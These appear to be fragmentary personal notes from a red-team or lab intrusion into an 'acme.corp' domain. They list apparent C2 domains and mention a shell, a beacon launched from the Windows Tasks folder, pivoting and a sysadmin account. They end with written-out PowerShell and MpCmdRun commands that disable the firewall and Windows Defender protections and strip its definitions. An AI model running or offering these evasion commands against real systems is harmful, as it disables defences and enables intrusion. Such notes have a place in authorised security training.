domains 
- qrictgydszhlhw.info
- nbqtddutqn.org
- znkfchsslimnfp.info
- bforgbdaurgjettxago.com

got shell after doing all the prep

run beacon from c"\windows\tasks

exe would on

![[Pasted image 20240426084508.png]]
 looks to be possible service

![[Pasted image 20240426115051.png]]
acne.corp 

![[Pasted image 20240426115211.png]]


pivoted through host on pivot listener

cotton is a sysadmin on domain

can access web.acme.corp
Set-NetFirewallProfile -Profile Domain,Public,Private -Enabled False

powerpick Set-MPPreference -DisableRealTimeMonitoring $true -Verbose; Set-MPPreference -DisableIOAVProtection $true -Verbose; Set-MPPreference -DisableIntrusionPreventionSystem $true -Verbose

remove all defnitions "C:\Program Files\Windows Defender\MpCmdRun.exe" -RemoveDefinitions -All